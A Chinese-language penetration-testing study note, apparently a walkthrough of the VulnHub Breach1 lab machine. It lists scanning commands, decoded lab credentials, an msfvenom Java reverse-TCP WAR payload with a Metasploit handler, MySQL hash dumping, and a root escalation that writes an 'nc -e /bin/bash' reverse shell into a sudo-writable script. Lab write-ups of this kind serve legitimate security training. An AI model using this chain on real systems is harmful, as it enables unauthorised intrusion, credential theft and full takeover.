```markdown
# VulnHub Breach1 渗透测试学习笔记

## 环境搭建

### 靶机配置
- **下载地址**:  
  `https://download.vulnhub.com/breach/Breach-1.0.zip`
- **网络模式**: 仅主机模式（Host-Only）
- **静态IP设置**:
  - IP: `192.168.110.140`
  - 子网掩码: `255.255.255.0`

### 攻击机配置（Kali）
- **网络模式**: 仅主机模式（与靶机同网段）
- **IP设置**: `192.168.110.128`

---

## 信息收集

### 端口扫描
```bash
nmap -T4 -A -v 192.168.110.140
```
- **结果**: 大部分端口开放，可能存在防火墙拦截。

### Web服务分析
- **访问地址**: `http://192.168.110.140`
- **源码分析**:
  - 发现Base64编码字符串:  
    `Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo`
  - **两次解码后**得到凭据:  
    `pgibbons:damnitfeel$goodtobeagang$ta`

### 目录扫描
```bash
dirb http://192.168.110.140/
```
- **发现路径**:  
  `http://192.168.110.140/images`（包含6张图片）

---

## 漏洞利用

### ImpressCMS 后台登录
- **入口**: `http://192.168.110.140/impresscms`
- **尝试使用凭据**: `pgibbons:damnitfeel$goodtobeagang$ta`
- **CMS漏洞搜索**（Exploit-DB）:
  - 可能的漏洞编号: `35134`（HTML注入）、`46239`（SQL注入）、`31431`（XSS）

### .keystore 文件分析
- **下载文件**:  
  `http://192.168.110.140/.keystore`
- **查看证书条目**:
  ```bash
  keytool -list -v -keystore keystore
  ```
- **导出证书**:
  ```bash
  keytool -importkeystore -srckeystore keystore -destkeystore tomcatkeystore.p12 -deststoretype pkcs12 -srcalias tomcat
  ```
- **Wireshark设置**:
  - 导入证书路径: `D:\tomcatkeystore.p12`
  - 密码: `tomcat`

---

## 流量解密与后台发现
- **过滤条件**:
  ```bash
  ip.src == 192.168.110.140 || ip.dst == 192.168.110.140 and http
  ```
- **关键流量**:
  - **管理后台地址**:  
    `https://192.168.110.140:8443/_M@nag3Me/html`
  - **HTTP Basic认证凭据**（Base64解码）:  
    `tomcat:Tt\5D8F(#!*u=G)4m7zB`

---

## 反弹Shell与提权

### 生成War包
```bash
msfvenom -p java/meterpreter/reverse_tcp lhost=192.168.110.128 lport=4444 -f war -o kali.war
```

### 监听设置（Kali）
```bash
msfconsole
use exploit/multi/handler
set payload java/meterpreter/reverse_tcp
set LHOST 192.168.110.128
set LPORT 4444
exploit
```

### 部署War包并访问
- **触发路径**:  
  `https://192.168.110.140:8443/kali/`
- **获取Meterpreter会话后操作**:
  ```bash
  getuid        # 查看当前用户
  sysinfo       # 系统信息
- 
  shell         # 进入系统Shell
- meterpreter> shell $ script -qc /bin/bash /dev/null # Linux系统
  ```

### 数据库提权
- **连接MySQL**:
  ```bash
  mysql -u root -p   # 密码为空
  ```
- **获取用户密码**:
  ```sql
  use mysql;
  select user,password from user;
  ```
  - **milton用户密码**（MD5解密）: `thelaststraw`
mysql -umilton -p thelaststraw

### 用户切换
```bash
su milton           # 密码: thelaststraw
su blumbergh        # 密码: coffeestains（通过图片隐写发现）
```

---

## 图片隐写分析
- **下载所有图片**:
  ```bash
  wget http://192.168.110.140/images/{bill.png,cake.jpg,initech.jpg,milton_beach.jpg,swingline.jpg,troll.gif}
  ```
- **分析图片**:
  ```bash
  strings bill.png    # 发现密码: coffeestains
  ```

---

## 最终提权
- **利用tidyup.sh脚本**:
  ```bash
  echo "nc -e /bin/bash 192.168.110.128 5555" > shell.txt
  cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
  ```
- **Kali监听**:
  ```bash
  nc -lvvp 5555
  ```

---

## 总结
- **关键路径**:
  1. 通过Base64解码获取初始凭据。
  2. 利用.keystore解密流量发现管理后台。
  3. 部署War包获取Meterpreter会话。
  4. 通过数据库和图片隐写提升至blumbergh用户。
  5. 利用tee命令覆盖脚本实现Root提权。
```